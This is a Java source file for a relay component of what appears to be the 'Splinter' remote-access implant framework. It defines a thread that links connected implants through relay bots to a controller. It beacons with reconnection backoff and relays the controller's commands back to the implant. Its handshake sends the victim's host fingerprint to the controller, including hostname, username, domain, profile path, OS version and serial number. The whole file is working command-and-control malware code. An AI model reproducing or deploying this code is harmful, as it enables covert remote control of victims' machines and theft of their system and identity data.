/**
 * Spawned when a new Implant connects to the Relay Bot
 * 
 * This thread simply pipes what every is received across one socket to the other
 * Once a new implant is connected to the relay bot, this thread infinite tries to connect to the controller (or another relay bot)
 * 
 * All socket connections, unless they are controller sockets will be handled by this thread class
 * 
 *  Thus, if a implant connects to the relay bot, the relay bot establishes this thread to connect out, this thread connection can actually connect to another relay bot, who will spawn another thread of this type, and will finally connect out to the controller
 * 
 * THIS THREAD FACES THE NEXT HOP RELAY, OR THE CONTROLLER
 * 
 * THIS THREAD IS THE Splinter_IMPLANT equivalent class that establishes a connection out to the controller
 * 
 * this thread is only spawned if the relay establishes a forward connection after an initial agent connects to the relay bot
 * 
 * 
 * @author Solomon Sonya
 */

package RelayBot;


import java.awt.*;
import java.awt.event.*;
import java.io.BufferedOutputStream;
import java.io.BufferedReader;
import java.io.File;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.OutputStreamWriter;
import java.io.PrintWriter;
import java.net.*;
import java.util.ArrayList;
import java.util.Scanner;

import javax.swing.*;

import Implant.Driver;
import Implant.FTP.FTP_ServerSocket;
import Implant.FTP.FTP_Thread_Receiver;
import Implant.FTP.FTP_Thread_Sender;
import Implant.Payloads.*;


public class DEPRECATED_RelayBot_ForwardConnectionThread extends Thread implements Runnable, ActionListener
{

	static String strMyClassName = "RelayBot_ForwardConnectionThread";

	DEPRECATED_RelayBot_AgentConnectedToRelayBot parent = null;

	
	String strAddrToController = "";
	int portToController = 0;
	boolean beaconUponDisconnection = false;
	boolean beaconToControllerImmediatelyUponDisconnection = false;
	int beaconInterval_millis = 0;

	boolean respondToTimerInterrupt = false;

	Timer tmrBeacon = null;

	public volatile boolean  continueRun = true;

	String myUniqueDelimiter = "";
	String randomNumberReceived = "";

	PrintWriter pwOut_ForwardController = null;

	public volatile boolean initialConnectionEstablished = false;

	Socket sktMyConnection = null;

	String myHandShake = null;

	MapSystemProperties systemMap = null;

	boolean listeningMode = false;

	

	volatile long disconnectionCount = 0;

	public String CURRENT_WORKING_DIRECTORY = "";
	volatile File fleCurrentWorkingDirectory = null;

	/**
	 * BEACON
	 * 
	 * @param controllerAddr
	 * @param controllerPort
	 * @param enableBeaconingUponDisconnection
	 * @param reconnectImmediatelyUponDisconnection
	 * @param beaconIntvl_millis
	 */
	public DEPRECATED_RelayBot_ForwardConnectionThread(DEPRECATED_RelayBot_AgentConnectedToRelayBot par, String strControllerAddie, int controllerPort, boolean enableBeaconingUponDisconnection, boolean reconnectImmediatelyUponDisconnection, int beaconIntvl_millis)
	{
		try
		{
			parent = par;
			strAddrToController = strControllerAddie;
			portToController = controllerPort;
			beaconUponDisconnection = enableBeaconingUponDisconnection;
			beaconToControllerImmediatelyUponDisconnection = reconnectImmediatelyUponDisconnection;
			beaconInterval_millis = beaconIntvl_millis;
			


		}
		catch(Exception e)
		{
			Driver.eop("Constructor - Beacon", "RelayBot_ImplantThread", e, e.getLocalizedMessage(), false);
		}
	}//end implant constructor mtd


	public void run()
	{
		if(sktMyConnection == null)
		{
			//establish the socket out to connect to the controller
			//once connected, let that method handle calling the listen to the  socket function
			startImplant();
		}
		else//we already have a socket established... i.e. this implant is in listening mode! the server socket already accepted a new socket for us. thus wait to act upon what we receive
		{
			//simply call listen to the socket to handle our infinite while on the socket
			this.listenToSocket(sktMyConnection);

			//we just made it here... meaning the socket has closed, remove this thread from the arraylist
			parent.removeForwardConnectionThread(this, this.getId());

			Driver.sop("Connection has been closed. Terminating this thread...");
			continueRun = false;
		}



		while(continueRun)
		{
			//just wait here for appropriate interrupt
		}
	}

	public boolean listenToSocket(Socket sktConnection)
	{
		//note, data received from this socket bufferedreader is from the forward controller (or relay), simply flush this data to my parent's printwriter to send to the agent
		
		try
		{
			/***
			 * 
			 * SOCKET CONNECTION WAS SUCCESSFUL!!!!!
			 * 
			 */

			//determine command!
			String inputLine = "";
			BufferedReader brIn_ForwardController = null;
			pwOut_ForwardController = null; 
			initialConnectionEstablished = true;

			if(sktConnection != null)
			{
				//good connection! open readers and determine command!

				//open streams
				Driver.sp("Connection established to forward controller (or relay)!  Attempting to open streams on socket...");

				//input from implant
				brIn_ForwardController = new BufferedReader(new InputStreamReader(sktConnection.getInputStream()));

				//output to implant
				pwOut_ForwardController = new PrintWriter(new BufferedOutputStream(sktConnection.getOutputStream()));

				//Streams opened
				Driver.sop("Streams opened");

				//get connection data
				/*myLocalControllerPort = sktMyConnection.getLocalAddress().toString();
					myLocalController_IP = "" + sktMyConnection.getLocalPort();
					myVictim_RHOST_IP = "" + sktMyConnection.getInetAddress().toString();
					myRemote_RHOST_Port = "" + sktMyConnection.getPort();*/

				//Handshake!					

				String myHandShakeData = getHandshakeData(Driver.delimeter_2);

				this.sendToController_Or_Next_Relay(Driver.RELAY_DELIMETER_INITIAL_REGISTRATION + myHandShakeData + Driver.delimeter_1 + parent.getHandShakeRowData(), false);

				//read myUniqueID
				randomNumberReceived = brIn_ForwardController.readLine();

				//Format unique ID
				//this.myUniqueDelimiter = Driver.SPLINTER_DELIMETER_OPEN + randomNumberReceived + "]";
				this.myUniqueDelimiter = Driver.SPLINTER_DELIMETER_OPEN + randomNumberReceived + "]";

				Driver.sop("HandShake complete. " + myUniqueDelimiter);

				
				//INFINITE WHILE!!!

				//while(continueRun && !sktMyConnection.isClosed() && (!(inputLine = brIn.readLine()).equals(Driver.DISCONNECT_TOKEN)) && inputLine != null)//listen until agent says disconnect
				while(continueRun && !sktConnection.isClosed() && ((inputLine = brIn_ForwardController.readLine()) != null /*&& !inputLine.equals(Driver.DISCONNECT_TOKEN)*/) )//listen until agent says disconnect
				{
					//HANDLE SPLINTER IMPLANT SPECIFICALLY
					if(inputLine.trim().startsWith(myUniqueDelimiter) || inputLine.trim().startsWith(Driver.RELAY_FORWARD_DELIMETER))
					{
						if(determineCommand(inputLine))
						{
							//personal command, so no need to relay it back over to agent
							continue;
						}
						
					}

					//otherwise, line did not match a special delimiter, SIMPLY RELAY THE LINE RECEIVED BACK TO THE CONNECTED IMPLANT
					parent.sendCommand_RAW_ToAgent(inputLine);

					//return to top of while to receive next command to execute
				}//end while

				//if we received the disconnect notice, terminate program
				if(inputLine.equals(Driver.DISCONNECT_TOKEN))//throws null pointer exception if disconnected!
				{
					Driver.sop("Disconnection notice received. Terminating program...");
					continueRun = false;
				}

			}// end if sktConnection != null

			return true;
		}
		catch(NullPointerException npe)
		{
			Driver.sop("Streams closed!");
		}
		catch(SocketException se)
		{
			Driver.sop("Streams closed!!!!");
		}
		catch(Exception e)
		{
			Driver.eop("listenToSocket", strMyClassName, e, e.getLocalizedMessage(), false);			
		}

		return false;
	}

	public boolean startImplant()
	{
		try
		{
			//HA!!!! A DO/WHILE.... I THINK THIS IS THE 2ND DO/WHILE I'VE EVER USED IN REAL-LIFE!
			do
			{
				//connect to controller (or next relay). if unsuccessful, it will throw Exception and handle it here
				try
				{
					Driver.sp("\n" + Driver.getTimeStamp_Without_Date() + " - Attempting to connect to \"" + strAddrToController + ":" + portToController + "\"...");

					if(strAddrToController != null && strAddrToController.trim().equalsIgnoreCase("localhost"))
					{
						strAddrToController = "127.0.0.1";
					}

					sktMyConnection = new Socket(strAddrToController, portToController);

					//APPEARS WE HAVE A NEW CONNECTION, VERIFY IT'S NOT NULL
					if(sktMyConnection == null)
					{
						throw new Exception("null socket returned!. Contact Solo and ref error Code 20130203");//this should never happen
					}
				}
				catch(Exception e)
				{
					//CONNECTION UNSUCCESSFUL!!!!!

					if(beaconToControllerImmediatelyUponDisconnection)
					{
						if(!initialConnectionEstablished)
						{
							beaconInterval_millis = 4 * 1000;//delay for 4 secs

							Driver.sop("Initial connection unsuccessful.  Delaying " + beaconInterval_millis/1000 + " secs and attempting to connect one more time to connect");
							beaconToControllerImmediatelyUponDisconnection = false;

							//give a 4 sec delay

							if(tmrBeacon != null && tmrBeacon.isRunning())
							{
								try
								{
									tmrBeacon.stop();
								}catch(Exception ee){}
							}

							respondToTimerInterrupt = true;							
							tmrBeacon = new Timer(4000, this);
							tmrBeacon.start();

						}


						//Driver.sop("Unable to connect to \"" + strAddrToController + " : " + portToController + "\"");
						//return startImplant();
					}

					else if(beaconUponDisconnection)
					{
						Driver.sop("Unable to connect to \"" + strAddrToController + ":" + portToController + "\"" + " Sleeping for " + beaconInterval_millis/1000 + " secs before attempting to re-establish connection to controller");
						respondToTimerInterrupt = true;
						tmrBeacon = new Timer(beaconInterval_millis, this);
						tmrBeacon.start();
						return true;						
					}

					else//no beacon is not set, unable to connect. close the program
					{
						throw new IOException("Unable to connect to \"" + strAddrToController + " : " + portToController + "\"" + " beaconing is not set. Terminating program...");
					}

				}

				listenToSocket(sktMyConnection);



				/*************
				 * 
				 * 
				 * CONNECTION CLOSED!
				 * 
				 * 
				 * 
				 * 
				 */

				//connection closed, check if we beacon back to controller after time elapses
				if(beaconToControllerImmediatelyUponDisconnection)
				{
					//only try this for 20 attempts, and then start sleeping and attempting to reconnect every 5 or so minutes

					if((++disconnectionCount)%10 == 0)
					{
						beaconToControllerImmediatelyUponDisconnection = false;
						beaconInterval_millis  = 60000;
						Driver.sop("\n***\n*\n*Threshold reached. Controller not responding. Waiting: " + beaconInterval_millis/1000 + " sec before reconnect\n*\n*\n***\n");
					}

					return startImplant();
					//startImplant();
				}

				if(beaconUponDisconnection && !beaconToControllerImmediatelyUponDisconnection && beaconInterval_millis > 1000)
				{
					//progressively prolong duration between next connects to keep from crashing
					if((++disconnectionCount)%10 == 0)
					{						
						beaconInterval_millis  = beaconInterval_millis*2;
						if(beaconInterval_millis > 3e6)
						{
							beaconInterval_millis = (int)3e6;
						}
						Driver.sop("Threshold reached. Controller not responding, waiting: " + beaconInterval_millis/1000 + " seconds before reconnect");
					}

					//this.sleep(arg0)
					respondToTimerInterrupt = true;

					//establish the beacon interval to handle calling the reconnect mtd
					Driver.sop("Disconnected. Sleeping for " + beaconInterval_millis/1000 + " secs before re-establishing connection to controller");
					tmrBeacon = new Timer(beaconInterval_millis, this);
					tmrBeacon.start();
					return true;
				}

				//otherwise, immediately reconnect to controller!
				Driver.sop("Connection lost!  ");

			}while(beaconUponDisconnection);

			//We got here, disconnected from Controller and user chose not to beacon. terminate prog
			throw new IOException("Disconnected from controller.  Beacon is not set.  Terminating program...");


			//return true;
		}

		catch(IOException ioe)
		{
			//TERMINATE PROGRAM!!!!
			Driver.sop("Disconnected from controller.  Beacon is not set.  Terminating thread...");
			continueRun = false;

		}

		catch(Exception e)
		{
			if(sktMyConnection != null && (sktMyConnection.isClosed() || !sktMyConnection.isConnected()))
			{
				Driver.sop("Socket is closed.");

				initialConnectionEstablished = false;

				//connection closed, check if we beacon back to controller after time elapses
				if(beaconToControllerImmediatelyUponDisconnection)
				{
					return startImplant();
				}

				if(beaconUponDisconnection && !beaconToControllerImmediatelyUponDisconnection && beaconInterval_millis > 1000)
				{
					//this.sleep(arg0)
					respondToTimerInterrupt = true;

					//establish the beacon interval to handle calling the reconnect mtd
					Driver.sop("Disconnected. Sleeping for " + beaconInterval_millis/1000 + " secs before connecting to controller");
					tmrBeacon = new Timer(beaconInterval_millis, this);
					tmrBeacon.start();
					return true;
				}

				//otherwise, terminate program
				Driver.sop("Terminating program...");
			}

			Driver.sop("Exception caught in startImplant mtd in " + this.strMyClassName + " Error msg: " + e.getLocalizedMessage());

			//e.printStackTrace(System.out);
		}

		return false;

	}

	public String getHandshakeData(String delimeter)
	{
		try
		{
			if(myHandShake == null)
			{
				systemMap = new MapSystemProperties(false);

				myHandShake = systemMap.strLaunchPath + delimeter + systemMap.strHOSTNAME + delimeter + systemMap.strOS_Name + delimeter + systemMap.strOS_Type + delimeter + systemMap.strUserName + delimeter + systemMap.strUSERDOMAIN + delimeter + systemMap.strTEMP + delimeter + systemMap.strUSERPROFILE + delimeter + systemMap.strPROCESSOR_IDENTIFIER + delimeter + systemMap.strNUMBER_OF_PROCESSORS + delimeter + systemMap.strSystemRoot + delimeter + systemMap.strServicePack + delimeter + systemMap.strNumUsers + delimeter + systemMap.strSerialNumber + delimeter + systemMap.strPROCESSOR_ARCHITECTURE + delimeter + systemMap.strCountryCode + delimeter + systemMap.strOsVersion + delimeter + systemMap.strHOMEDRIVE;; 

				try
				{
					if(systemMap.strLaunchPath == null || systemMap.strLaunchPath.trim().equals(""))
					{
						CURRENT_WORKING_DIRECTORY = "." + Driver.fileSeperator;
					}
					else
					{						
						if(systemMap.strLaunchDirectory.endsWith(Driver.fileSeperator))
							CURRENT_WORKING_DIRECTORY = systemMap.strLaunchDirectory;
						else
							CURRENT_WORKING_DIRECTORY = systemMap.strLaunchDirectory + Driver.fileSeperator;
					}



				}catch(Exception e){CURRENT_WORKING_DIRECTORY = "." + Driver.fileSeperator;}

				fleCurrentWorkingDirectory = new File(this.CURRENT_WORKING_DIRECTORY);

				//return already populated handshake
				return myHandShake;
			}

			else//return already populated handshake
			{
				return myHandShake;
			}
		}
		catch(Exception e)
		{
			Driver.eop("getHandshakeData", strMyClassName, e, e.getLocalizedMessage(), false);
		}

		return "";
	}

	public boolean sendToController_Or_Next_Relay(String lineToSend, boolean printStatusToConsoleOut)
	{
		try
		{
			
			pwOut_ForwardController.println(lineToSend);
			pwOut_ForwardController.flush();

			if(printStatusToConsoleOut)
				Driver.sop(lineToSend);

			return true;

		}
		catch(Exception e)
		{
			Driver.eop("sendToController_Or_Next_Relay", strMyClassName, e, e.getLocalizedMessage(), false);
		}

		return false;
	}

	public boolean determineCommand(String cmdLine)
	{
		try
		{
			Driver.sop("No special methods in " + this.strMyClassName + " determineCommand yet");




			String [] cmd = cmdLine.split(Driver.delimeter_1);

			if(cmd[1] == null || cmd[1].trim().equals(""))
			{
				Driver.sop("Unknown Command received: " + cmdLine);
				return false;
			}

			
//return true;

		}
		catch(Exception e)
		{
			Driver.sop("Unknown Command received: " + cmdLine);
		}

		return false;
	}

	


	public void actionPerformed(ActionEvent ae)
	{
		try
		{
			if(ae.getSource() == tmrBeacon && respondToTimerInterrupt)
			{
				//stop timer from further interrupts
				try
				{
					tmrBeacon.stop();					
				}catch(Exception e){}

				respondToTimerInterrupt = false;

				//re-establish connection!
				startImplant();
			}
		


		}
		catch(Exception e)
		{
			Driver.eop("AE", strMyClassName, e, e.getLocalizedMessage(), false);
		}
	}


	














}//end implant class